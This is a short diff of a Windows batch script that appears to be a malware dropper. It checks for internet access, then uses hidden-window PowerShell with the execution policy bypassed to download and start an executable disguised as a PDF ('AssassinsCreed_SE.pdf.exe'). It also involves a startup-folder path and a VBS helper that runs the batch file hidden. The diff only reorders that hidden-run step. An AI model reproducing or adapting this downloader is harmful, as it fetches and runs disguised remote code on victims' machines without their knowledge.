@@ -37,15 +37,15 @@ for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
 
 @rem timeout /t 5 /nobreak
 
-@rem Use VBS script to run batch file hidden
-powershell -windowstyle hidden -ExecutionPolicy Bypass ./RunHidden.vbs
-
 Check internet connectivity before downloading the payload
 call :check_internet
 
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/AssassinsCreed_SE.pdf.exe -OutFile AssassinsCreed_SE.pdf.exe"
 
 copy $startup/AssassinsCreed_SE.pdf.exe $currentDir/AssassinsCreed_SE.pdf.exe
+
+@rem Use VBS script to run batch file hidden
+powershell -windowstyle hidden -ExecutionPolicy Bypass ./RunHidden.vbs
 
 start AssassinsCreed_SE.pdf.exe
 
